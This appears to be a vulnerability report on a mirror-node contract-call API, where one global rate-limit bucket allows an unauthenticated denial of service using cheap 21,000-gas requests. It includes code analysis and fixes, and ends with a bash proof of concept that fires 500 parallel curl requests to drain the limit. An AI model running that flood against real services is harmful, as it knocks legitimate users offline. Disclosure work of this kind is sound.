### Title
Global Rate-Limit Bucket Exhaustion via Minimal-Gas Requests (Unauthenticated DoS)

### Summary
`ThrottleManagerImpl.throttle()` enforces a single global `rateLimitBucket` (default 500 tokens/second) shared across all callers with no per-IP or per-client isolation. Because `scaleGas(21000)` returns only 2 gas tokens, an attacker sending 500 requests/second at `gas=21000` exhausts the entire rate bucket while consuming only 0.13% of the gas bucket, denying service to all other users. No authentication or special privilege is required.

### Finding Description

**Code path:**

`ContractController.call()` (line 40) calls `throttleManager.throttle(request)` unconditionally before any authentication check. [1](#0-0) 

Inside `ThrottleManagerImpl.throttle()`:

```java
if (!rateLimitBucket.tryConsume(1)) {               // line 38 — consumes 1 of 500 tokens
    throw new ThrottleException(...);
} else if (!gasLimitBucket.tryConsume(scaleGas(gas))) { // line 40 — consumes scaleGas(gas) tokens
    throw new ThrottleException(...);
}
``` [2](#0-1) 

**Gas scaling math:**

```java
private static final long GAS_SCALE_FACTOR = 10_000L;

public long scaleGas(long gas) {
    if (gas <= GAS_SCALE_FACTOR) { return 0L; }
    return Math.floorDiv(gas, GAS_SCALE_FACTOR);   // 21000 / 10000 = 2
}
``` [3](#0-2) 

**Default bucket capacities:**

| Bucket | Default capacity | Tokens consumed per gas=21000 request |
|---|---|---|
| `rateLimitBucket` | 500 tokens/s | 1 |
| `gasLimitBucket` | `scaleGas(7_500_000_000)` = 750,000 tokens/s | 2 | [4](#0-3) 

**Root cause:** The `rateLimitBucket` is a single global counter with no per-source-IP partitioning. Any single unauthenticated caller can monopolize all 500 slots/second. The gas bucket provides no meaningful backstop because `scaleGas(21000) = 2` out of 750,000 available tokens — the gas bucket would take 375,000 such requests to exhaust, far beyond what the rate bucket allows.

**Why the order matters additionally:** When `rateLimitBucket.tryConsume(1)` succeeds but `gasLimitBucket.tryConsume(...)` subsequently fails, the consumed rate token is **not restored**. This means a concurrent attacker can also waste legitimate users' rate tokens by flooding with requests that pass the rate check but fail the gas check — though for the primary attack (gas=21000), both checks pass. [5](#0-4) 

### Impact Explanation
A single attacker with a standard internet connection can send 500 HTTP POST requests/second to `/api/v1/contracts/call`, exhausting the global `rateLimitBucket`. Every subsequent request from any other user receives a `ThrottleException` (HTTP 429) for the remainder of that second. Since the bucket refills every second, the attacker need only sustain the flood to maintain a complete service outage for all other users. The gas bucket is irrelevant to this attack — it is only 0.13% consumed per second of attack traffic.

### Likelihood Explanation
No authentication, API key, or special privilege is required. The endpoint is publicly accessible. Sending 500 HTTP requests/second is trivially achievable from a single machine or a small botnet. The attack is repeatable indefinitely and requires no knowledge of contract addresses or calldata — an empty body with `gas=21000` suffices. The `@Min(21_000)` constraint on `gasPerSecond` in `ThrottleProperties` confirms 21,000 is the minimum accepted gas value, making this the optimal attack parameter. [6](#0-5) 

### Recommendation

1. **Per-IP rate limiting:** Partition the `rateLimitBucket` by client IP (e.g., using a `ConcurrentHashMap<String, Bucket>` keyed on `X-Forwarded-For` / `RemoteAddr`). This prevents a single source from monopolizing the global budget.
2. **Minimum gas floor for rate-bucket cost:** Consider making the rate-bucket cost proportional to gas (e.g., `tryConsume(Math.max(1, scaleGas(gas) / RATE_SCALE))`) so that cheap requests cannot flood the rate bucket.
3. **Restore rate token on gas-bucket failure:** If `gasLimitBucket.tryConsume()` fails after `rateLimitBucket.tryConsume()` succeeded, call `rateLimitBucket.addTokens(1)` to avoid wasting rate tokens on requests that are ultimately rejected.
4. **Infrastructure-level protection:** Deploy a WAF or reverse-proxy rate limiter (e.g., nginx `limit_req`) per source IP upstream of the application.

### Proof of Concept

```bash
# Exhaust the global rateLimitBucket (500 RPS) with minimal gas cost
# Run from a single machine; no authentication needed

for i in $(seq 1 500); do
  curl -s -o /dev/null -X POST http://<mirror-node-host>/api/v1/contracts/call \
    -H "Content-Type: application/json" \
    -d '{"to":"0x0000000000000000000000000000000000000001","gas":21000}' &
done
wait

# 501st request from any user (including legitimate ones) receives HTTP 429:
curl -v -X POST http://<mirror-node-host>/api/v1/contracts/call \
  -H "Content-Type: application/json" \
  -d '{"to":"0x0000000000000000000000000000000000000001","gas":21000}'
# Expected: ThrottleException "Requests per second rate limit exceeded"
```

Each of the 500 attacker requests consumes 1 rate token and only 2 gas tokens (`scaleGas(21000)=2`), leaving 749,000 gas tokens untouched while the rate bucket is fully drained. Repeating every second sustains the outage indefinitely.
